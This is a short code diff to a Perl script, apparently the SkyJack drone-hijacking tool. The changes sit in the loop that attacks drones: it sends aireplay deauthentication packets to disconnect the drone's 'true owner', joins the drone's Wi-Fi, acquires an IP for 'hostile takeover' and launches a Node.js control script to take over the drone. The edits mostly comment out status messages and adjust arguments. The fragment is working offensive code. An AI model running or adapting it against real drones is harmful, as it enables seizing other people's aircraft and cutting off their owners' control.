@@ -118,6 +118,7 @@ while (1)
 			# sucker.
 			print "Disconnecting the true owner of the drone ;)\n\n";
 			sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface);
+			#sudo($aireplay, "-0", "3", "-a", $clients{$cli}, $interface);
 
 		}	
 
@@ -132,11 +133,12 @@ while (1)
 			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
 			next if $skyjacked{$chans{$drone}[1]}++;
 
-			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
+			#print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
 			sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
-
-			print "Acquiring IP from drone for hostile takeover\n";
-			sudo($dhclient, "-v", $interface2);
+			#sudo($iwconfig, $interface2, "key", "open", "mode", "Managed", "essid", $chans{$drone}[1], "channel", $chans{$drone}[0]);
+			
+			#print "Acquiring IP from drone for hostile takeover\n";
+			sudo($dhclient, $interface2);
 
 			print "\n\nTAKING OVER DRONE\n";
 			sudo($nodejs, $controljs);
